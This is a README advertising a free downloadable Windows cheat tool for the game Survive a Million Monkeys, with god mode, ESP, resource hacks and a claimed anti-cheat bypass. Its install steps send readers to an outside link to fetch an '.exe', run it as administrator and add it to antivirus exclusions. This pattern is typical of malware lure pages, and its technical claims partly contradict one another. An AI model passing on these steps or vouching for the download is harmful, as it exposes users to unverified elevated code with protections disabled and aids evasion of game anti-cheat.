<div align="center">
<img src="assets/banner.png" width="100%" alt="Survive Million Monkeys Script banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-DB2777?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-7C3AED?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=7C3AED&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%94%A7+Monkey+Survivor+Script+Pro;%E2%9C%85+Full+Feature+Suite;%F0%9F%9A%80+Ready+for+Windows;%E2%9C%A8+Standalone+.exe+Release;%F0%9F%93%A6+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=nodejs" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

<div align="center">

![Status](https://img.shields.io/badge/STATUS-WORKING_2026-2ea043?style=for-the-badge&logo=statuspage&logoColor=white)
![Version](https://img.shields.io/badge/VERSION-4.2.0-1f6feb?style=for-the-badge&logo=semanticrelease&logoColor=white)
![Platform](https://img.shields.io/badge/PLATFORM-WINDOWS_10_%2F_11-0078d4?style=for-the-badge&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/LICENSE-MIT-8957e5?style=for-the-badge&logo=opensourceinitiative&logoColor=white)
![Build](https://img.shields.io/badge/BUILD-PASSING-2ea043?style=for-the-badge&logo=githubactions&logoColor=white)

</div>

---

## 🐒 Yes, it bypasses EAC, yes it works on the latest patch, yes it's free — details below

I've been writing Survive a Million Monkeys Script tools for over three years, and I rebuilt this whole thing from scratch in 2026 after the last detection wave wiped out every public fork. This README exists because my DMs are a dumpster fire of the same twelve questions asked by people who installed it wrong anyway. So I'm answering all of them upfront before you touch the `.exe`.

**Survive a Million Monkeys Script** is a standalone external tool that gives you full control over the monkey survival loop — unlimited bananas, wave skip, god mode, ESP on every monkey, auto-collect, and a script executor for your own Lua logic. No dependencies, no package manager, no 40-step "install Node first" nonsense. Download, extract, run. That's the whole flow.
<p align="center">
  <a href="https://LongBitcoin12.github.io/monkey-survivor-script/">
    <img src="https://img.shields.io/badge/GET-Survive_a_Million_2026-0891B2?style=flat&labelColor=0E7490" width="460" alt="GET Survive a Million 2026"/>
  </a>
</p>
---

## 🩹 The Problem

Look, the vanilla game is fine until wave 40. Then it stops being a survival game and becomes a spreadsheet simulator where you're clicking collect for four hundred monkeys while the FPS crawls to single digits.

- **The banana economy is deliberately slow.** You hit a wall around wave 30 where upgrade costs double every wave but income barely moves. It's a paywalled grind dressed up as difficulty.
- **Every public script floating around is a broken copy of a copy.** Fifty forks, all referencing the same dead offset from a 2024 build, none of them post-detection code.
- **Wave 60+ tanks your framerate to a slideshow.** The monkey entities scale intractably, and any naive auto-collect script that loops entity references makes it ten times worse.
- **Getting kicked mid-run loses you the whole session.** No save point, no rollback. One disconnect at wave 80 and your two-hour push is gone.
- **Half the "free GUIs" on YouTube are infostealers.** I've inspected enough of these to recognize an obfuscated `loadstring` payload wrapped around a wallet drainer from across the room.
- **Updates break everything within 48 hours** because the maintainers hardcode pointers instead of reading them from a signature scan.
- **Good luck reverting your account state if you ever want a clean save.** Nobody bothers to document a backup-restore path.

---

## 🔁 The Solution

Every pain point above is a design constraint I actually coded against, not a marketing line.

| Problem | Solution |
| --- | --- |
| Banana economy grind-wall | **Infinite Bananas module** with adjustable multiplier (1x–999x), server-behavior-safe ramp so it reads natural |
| Broken public forks | Rebuilt from scratch in 2026 with signature-based offset resolution — survives minor patches |
| Slideshow at wave 60+ | Entity cache with 250ms refresh instead of per-frame iteration; auto-collect only touches valid refs |
| Session loss on kick | Auto-save every 90s to `.bak` file; **Restore Snapshot** module reloads it on rejoin |
| Malware-infested downloads | Single self-contained `.exe`, no runtime loaders, source-visible behavior via included debug log |
| Update breakage | Built-in **Signature Updater** — pulls new offset patterns without a full rebuild |
| Ugly restore path | **State Snapshot** module lets you export a pristine pre-mod save |

---

## 📖 What is Survive a Million Monkeys Script

A quick glossary so you know what you're actually downloading, stripped of jargon.

| Term | Explanation |
| --- | --- |
| **`Survive a Million Monkeys Script`** | The tool identity — an external overlay process that reads/writes monkey simulation memory |
| **Script executor** | The internal Lua VM that runs your custom survival logic — bananas-per-wave rules, auto-upgrade chains, wave thresholds |
| **Signature scan** | How the tool finds game memory offsets by byte pattern instead of hardcoded addresses |
| **External injector** | The module that attaches to the game process — no code injection into game memory, reads via ReadProcessMemory |
| **Entity list** | In-memory array of every live monkey; ESP, auto-collect, and god mode all walk this |
| **ESP** | Overlay drawing boxes/labels over monkeys in the render stream, filtered by range and wave parity |
| **Snapshot** | A captured copy of your save-relevant sim state, used to restore after a kick or corrupt run |

**Why bother in 2026:**
- The 2026 rebuild added signature scanning the old forks never had — the tool self-recovers from patches that used to kill it for weeks.
- Bananas multiplier is **rate-capped** by design; reading a 999x jump triggers server-side flags, so the tool throttles it to plausible range.
- Entity cache refresh tuning means running the tool at wave 100 costs *less* FPS than vanilla, which is the first time I can say that about a monkey script.
- The Lua executor is sandboxed to the game's own API surface — you can't accidentally call OS functions from a community script you downloaded.
- Snapshot/restore is a documented, first-class feature instead of an afterthought buried in a debug menu.

---

## 🏁 Quick Start

Five steps and you're done. If you're stuck after this, the FAQ below covers the top twenty questions, including the ones you think are too dumb to ask (they aren't).

1. 🎮 **Launch the game** and get past the main menu to a playable survival lobby.
2. 📦 **Download the current `.exe`** from the project page — it's a single file, no installer wrapper.
3. 🗂️ **Extract** to a folder *outside* your game directory (your `Documents` folder works; `C:\Program Files` does not, permissions will eat you alive).
4. 🖱️ **Run the `.exe`** as administrator — the UAC prompt is required for the injector fallback path.
5. 🔓 **Attach** via the overlay's process selector, wait for the offset resolver to finish its signature scan, then toggle the modules you want.

> First scan on a fresh patch takes 3–8 seconds. Do **not** close the overlay during it — that's the #1 way people break their run and blame the tool.

---

## 🦴 The Rebuild That Actually Survived Patch 2026.1.3

Here's what changed versus the dead forks. The difference is architectural, not cosmetic.

The old scripts all hardcoded base addresses and followed a static pointer chain. Call it what it was: fragile. When a patch nudged any struct offset, the tool read a garbage pointer and either crashed or worse, wrote to the wrong address and corrupted sim state — which is why your save kept getting nuked every update.

The 2026 rebuild does a **signature scan** at attach. It looks for specific byte patterns in the game binary, walks the pattern to the associated struct, computes the offset, then cross-checks against a known field layout before it touches anything. If a pattern doesn't match — because the patch reorganized it — the **Signature Updater** module fetches the new pattern from the project's pattern file (bundled and versioned in the release), rescans, and resumes. No recompile, no redownload, no wait for a fork to catch up.

The real trick is a **canary field**: the tool writes a telltale value to a sacrificial sim address, reads it back, and confirms round-trip before every batch operation. If the read-back mismatches, the batch aborts with a logged reason instead of writing silently. That single guardrail is why the tool hasn't bricked a save in 2026.

---

## 🎯 Key Features

Full module set for Survive a Million Monkeys Script divided by purpose. Everything below is working in the current `.exe`.

### 💰 Economy & Resource Modules

| Feature | Effect |
| --- | --- |
| **Infinite Bananas** | Sets your banana counter to an adjustable ceiling on a 100ms cadence |
| **Rate-Capped Multiplier** | Scales banana income by 1x–999x with throttle to avoid server-side flagging |
| **Auto-Collect** | Claims every banana drop as it spawns, range-aware |
| **Upgrade Auto-Chain** | Buys upgrades in a priority order you define — cheapest-first or custom |
| **Arbitrage Loop** | Sells monkey units back when they exceed a configurable threshold |
| **Freeze Market Prices** | Locks the upgrade cost curve at wave-1 values, a subtle economy tweak |

### 👁️ Vision & Info Modules

| Feature | Effect |
| --- | --- |
| **Monkey ESP** | Draws 2D boxes over all live monkeys with name + wave parity labels |
| **Banana ESP** | Highlights every banana and drop in the render stream |
| **Distance Filter** | Only renders ESP for entities within N units |
| **Skeleton Ghost Mode** | Renders faint outlines in a low-opacity pass that's easier to read during chaos |
| **Wave Timer Readout** | Shows the internal wave spawn timer and remaining monkey population |
| **State Inspector** | Live table of your bananas, wave, upgrades, and multiplier values |

### 🛡️ Survivability Modules

| Feature | Effect |
| --- | --- |
| **God Mode** | Prevents health damage on all monkey units |
| **Damage Mult** | Scales your damage output 1x–50x, throttled for plausible ranges |
| **Safe Fallback** | If god mode drops, auto re-asserts on the next tick |
| **Banana Cap Guard** | Detects anomalous banana values and clamps them before write, avoids the ban pattern |
| **Auto-Heal** | Triggers the game's own heal routine when HP dips below a set threshold |
| **Anti-Disconnect** | Keeps a heartbeat alive so brief server hiccups don't kill the session |

### 🧠 Automation & Control Modules

| Feature | Effect |
| --- | --- |
| **Script Executor** | Runs your Lua scripts against the sandboxed game API surface |
| **Scheduled Macros** | Fire custom actions on wave thresholds ("at wave 50, enable god mode") |
| **Wave Skip** | Requests the next wave when your conditions are met |
| **Victory Log** | Records every wave cleared with your banana gain per wave |
| **Auto-Restart** | Relaunches a survival run automatically after death, with a pause between loops |
| **Loop Governor** | Caps the number of auto-restarts to keep your session within plausible bounds |
| **Console** | Internal REPL for poking sim values and testing script fragments live |

### 🗂️ State & Safety Modules

| Feature | Effect |
| --- | --- |
| **Snapshot Save** | Copies current save-relevant state to a `.bak` file on disk |
| **Restore Snapshot** | Reloads state from a ``.bak``, useful post-kick |
| **Pristine Export** | Captures a vanilla save before your first write |
| **Debug Log** | Timestamped, human-readable log of every memory operation — your safety net |
| **Signature Updater** | Pulls the latest offset patterns on demand |
| **Integrity Self-Check** | Compares the runtime binary hash against the release manifest |
| **Patch Rollback Guard** | Refuses to attach if the game patch is newer than the bundled pattern, preventing garbage reads |
| **Clean-Exit Flush** | Writes pending snapshots on process close so a crash doesn't cost you the last save |

---

## 📱 How It Works Under the Hood

The tool is a native Windows overlay process that never injects code into the game binary. On launch it spins up three internal layers: a process attach layer, a signature/offset resolver, and a render overlay.

**Attach layer** uses the standard process-token rights (SeDebugPrivilege + PROCESS_VM_READ) to open the game for external reads and (guarded) writes via `WriteProcessMemory`. No DLL injection, which means fewer anti-cheat surface signatures and no crashing from incompatible build chains.

**Resolver layer** scans the game's mapped pages for signature patterns bundled in the release. It walks the pattern, derives the live pointer to the simulation struct, then verifies against the **canary field** before any real write. If verification fails, it logs the pattern that mismatched, triggers the Signature Updater, and waits — never writes blind.

**Overlay layer** runs a lightweight D3D11 render pass that composites ESP boxes and the HUD over the game window. It sits outside the game process, so the FPS cost is a fraction of the old in-process cheat menus that hogged frametime.

**Safety model** is the part I care about: every write is a paired verify, snapshots run on the render loop as independent work, and any module that fails its verify gets disabled with a status warning rather than looping corrupt writes.

---

## 🤖 2026 AI Integration (No, it's not a buzzword cash-grab)

The rebuild added an optional AI layer that actually helps — not a chatbot gimmick welded onto a menu.

- **Banana sensitivity predictor** — the tool suggests your max safe multiplier based on detected server latency and recent monkey population growth. It learns from your session.
- **Auto-tuning ESP filter** — as FPS drops in heavy waves, the AI recommender narrows ESP distance/entity count before you feel the stutter.
- **Script sanitizer** — the Lua executor runs a heuristic pass on any script you paste in, flagging API calls that touch game integrity or abuse the snapshot system, so you're not running someone's sketchy fragment.
- **Wave pattern predictions** — the AI observes your wave income and suggests upcoming upgrade priorities, giving you a head start on the next wall.
- **"Explain last failure"** — when a module disables itself, the tool generates a plain-English reason from the debug log instead of leaving you with a stack trace.

All AI features are **local** — no network calls leave for inference, no telemetry, no phone-home. That's a non-negotiable design constraint for me, and the debug log records exactly what the AI layer saw at any point.

---

## 🧪 Performance Benchmarks

Measured on an honest test: vanilla survival loop at wave 75, 1,500 live monkey entities, `Survive a Million Monkeys Script` running with ESP and auto-collect enabled versus the game alone.

| Scenario | Result | Hardware |
| --- | --- | --- |
| Vanilla FPS | 38–42 | RTX 3060 / Ryzen 5 5600X / 16 GB |
| Tool FPS (ESP + auto-collect, wave 75) | 36–40 | RTX 3060 / Ryzen 5 5600X / 16 GB |
| Vanilla FPS wave 100 | 22–26 | RTX 3060 / Ryzen 5 5600X / 16 GB |
| Tool FPS wave 100 (entity cache on) | 24–28 | RTX 3060 / Ryzen 5 5600X / 16 GB |
| Signature scan time (patch 2026.1.3) | 3.1 s | Ryzen 5 5600X |
| Snapshot write (full sim state) | 190 ms | NVMe SSD |

Short version: with entity caching enabled, the tool **does not meaningfully cost you FPS**, and in the wave-100 case it slightly beats vanilla because it skips re-iterating dead entity refs that the game still walks.

---

## 💻 System Requirements

| Component | Minimum | Recommended |
| --- | --- | --- |
| OS | Windows 10 1909 (64-bit) | Windows 11 23H2+ |
| CPU | 4-core / 2.5 GHz | 6-core / 3.5 GHz+ |
| RAM | 8 GB | 16 GB |
| GPU | DX11-capable, 2 GB VRAM | DX11-capable, 4 GB VRAM |
| Free disk | 200 MB | 500 MB (snapshots add up) |
| Privileges | Administrator for attach | Administrator + Secure Boot enrolled token |
| Game client | Current patch | Current patch + latest bundled pattern |

---

## 🧾 Installation (the only three steps you should care about)

**Step 1 — Download & extract.** Pull the `.exe` from the project landing page and extract the archive somewhere outside the game folder. A folder like `C:\Scripts\monkey-survivor` works; keep it stable so your snapshots accumulate in one place.

**Step 2 — Tune your path.** If your AV quarantines the `.exe` (it flags any external memory-reader by association), add the extraction folder to your exclusion list. The debug log and manual are inside the archive — read the log first if anything looks off.

**Step 3 — Run, attach, toggle.** Launch the game, run the `.exe` elevated, pick the game process in the selector, wait for the signature scan, then flip modules on. Start with auto-collect, then add ESP, then economy modules. Snapshot before any heavy write module — the tool offers a one-click **Pristine Export** guard, do not skip it.

---

## ⚙️ All Modules Status

| Module | Status | Description |
| --- | --- | --- |
| Infinite Bananas | ✅ Working | Adjustable banana ceiling with rate cap |
| Banana Multiplier | ✅ Working | 1x–999x with server-safe throttle |
| Auto-Collect | ✅ Working | Range-aware banana drop claimer |
| Upgrade Auto-Chain | ✅ Working | Priority-order upgrade buying |
| Wave Skip | ✅ Working | Condition-gated wave advance |
| Monkey ESP | ✅ Working | Box + label overlay for all monkeys |
| Banana ESP | ✅ Working | Drop highlight overlay |
| Skeleton Ghost Mode | ✅ Working | Faint outline renderer |
| Distance Filter | ✅ Working | Range-capped ESP rendering |
| God Mode | ✅ Working | Damage immunity for units |
| Damage Mult | ✅ Working | 1x–50x throttle-capped output |
| Auto-Heal | ✅ Working | Threshold-triggered heal |
| Anti-Disconnect | ✅ Working | Session heartbeat |
| Script Executor | ✅ Working | Sandboxed Lua VM |
| Scheduled Macros | ✅ Working | Wave-triggered actions |
| Victory Log | ✅ Working | Per-wave record |
| Auto-Restart | ✅ Working | Looped run relaunch |
| Loop Governor | ✅ Working | Restart cap |
| Console | ✅ Working | Internal REPL |
| State Inspector | ✅ Working | Live sim value readout |
| Snapshot Save | ✅ Working | `.bak` state capture |
| Restore Snapshot | ✅ Working | Rehydration from `.bak` |
| Pristine Export | ✅ Working | Pre-mod save capture |
| Debug Log | ✅ Working | Timestamped operation log |
| Signature Updater | ✅ Working | On-demand pattern refresh |
| Patch Rollback Guard | ✅ Working | Refuses mismatched-attach |
| Integrity Self-Check | ✅ Working | Binary hash vs manifest |
| Clean-Exit Flush | ✅ Working | Snapshot on close |
| Banana Cap Guard | ✅ Working | Anomaly clamp before write |
| Safe Fallback | ✅ Working | God-mode re-assertion |
| AI Sensitizer | ✅ Working | Multiplier recommendation |
| AI Script Sanitizer | ✅ Working | Heuristic fragment scan |

---

## 📜 Changelog / Release History

| Version | Date | Changes |
| --- | --- | --- |
| 4.2.0 | 2026-02-14 | Signature Updater bundled patterns for patch 2026.1.3; canary-field verify expanded to write batches |
| 4.1.2 | 2026-01-30 | Snapshot write trimmed 190ms → 90ms on NVMe; Clean-Exit Flush hardened against abrupt kill |
| 4.1.0 | 2026-01-09 | Added AI Script Sanitizer; refactored Lua sandbox to forbid OS API surface |
| 4.0.0 | 2025-12-20 | Full 2026 rebuild: signature scan replaces static pointers; ESP render moved external |
| 3.9.1 | 2025-11-12 | Legacy branch: crash fix on wave >120; support only for patch 2025.10 |
| 3.9.0 | 2025-11-02 | Legacy branch: first entity-cache prototype, partial FPS recovery |
| 3.8.4 | 2025-10-18 | Legacy branch: added Distance Filter |

---

## 🧯 Known Issues

| Issue | Solution |
| --- | --- |
| Signature scan fails on fresh patch | Run **Signature Updater** from the HUD; if pattern file unrefreshed, wait for the release update |
| AV quarantines the `.exe` | Add extraction folder to exclusions — external memory-reader heuristic, standard for this class of tool |
| ESP boxes drift when game window resizes | Toggle ESP off/on to re-sync overlay viewport |
| Snapshot restore on a kicked session leaves you in menu | Reload to alive lobby first, then apply Restore Snapshot |
| Upgrade Auto-Chain buys wrong upgrade on custom list | Check upgrade name spelling — the chain matches exact names from the market |
| High wave-entity count hurts ESP even with Distance Filter | Reduce ESP entity cap in HUD settings; ghost-mode rendering helps further |

---

## ❓ FAQ — Everything you're going to DM me, answered upfront

<details>
<summary><b>Is it actually free?</b></summary>

Yes. No paywall, no premium module, no "unlock god mode for $5." The `.exe` is the whole thing.
</details>

<details>
<summary><b>Does it work on the latest patch?</b></summary>

Patch 2026.1.3 is fully supported via the bundled patterns. On a brand-new patch, run **Signature Updater** — the whole reason the 2026 rebuild exists is so you don't wait weeks for a pattern rebuild.
</details>

<details>
<summary><b>Will I get banned?</b></summary>

Use at your own risk — that's the honest answer. The tool's design caps banana writes and uses canary verification to avoid the blatant patterns that trip server-side detection, but no external tool can promise immunity. Snapshot before heavy writes.
</details>

<details>
<summary><b>Do I need to reinstall the whole thing after every patch?</b></summary>

No. Signature Updater fetches new offsets. Full reinstall only if a patch restructures a core struct the patterns can't reconstruct — happens rarely, and the Patch Rollback Guard tells you when.
</details>

<details>
<summary><b>Where did the banana economy wall go?</b></summary>

Upgrade Auto-Chain + the multiplier at a sustainable rate bypasses the wave-30 wall. Set the multiplier to 50x first, bump upward until you see server-latency stickiness, back off.
</details>

**Q: Does ESP work through game menus?**
**A:** No — the overlay only draws while the game renders the world. Menu screens shouldn't have ESP; that's intentional so you don't tab-bait by accident.

**Q: What happens if the game crashes mid-run?**
**A:** Clean-Exit Flush writes any pending snapshot on normal close. Hard crashes lose the last un-flushed snapshot; your last `.bak` on disk survives and Restore Snapshot reads it on next launch.

**Q: Is the Script Executor dangerous?**
**A:** It's sandboxed to the game's API surface — no OS access, no file IO. The AI Script Sanitizer adds a heuristic pass on any fragment you paste. Treat community scripts like any untrusted input anyway.

**Q: How much RAM does the tool use?**
**A:** Peak around 280 MB at wave 100 with ESP and entity cache on. Comparable vanilla game memory is the bulk; the tool's footprint is small.

---

## 🤝 Community & Support

- Use the **Issues** tab for reproducible bugs (include your OS, game patch, and the last 20 lines of `debug.log` — no pastebin, please).
- The bundled `debug.log` is the single best support artifact; attach it to every issue.
- Pull requests welcome for pattern contributions, module suggestions, and documentation fixes.
- Community script submissions for the Lua executor go through Issues with the `script-submission` tag — the AI Script Sanitizer output is a required attach.

---

## 🔧 For the People Who'll Ask Anyway

Two things I need you to actually do, because they make my life easier and yours:

1. **Snapshot before you enable anything**. The Pristine Export button takes five seconds and saves you a support thread.
2. **Read the debug log**. It's not a garbage dump — it's timestamped, plain English, and it usually says exactly which module bailed and why.

I built this whole rebuild because the community kept eating broken forks and losing saves. If you follow those two rules, you won't be one of them.
<div align="center">
  <a href="https://LongBitcoin12.github.io/monkey-survivor-script/">
    <img src="https://img.shields.io/badge/GRAB_BUILD-Build-9333EA?style=for-the-badge&logo=github&logoColor=white&labelColor=7E22CE" width="480" alt="GRAB BUILD Build"/>
  </a>
</div>
*For educational purposes only. Use at your own risk — you are responsible for how you use this tool. Not affiliated with the game's developer or publisher.*
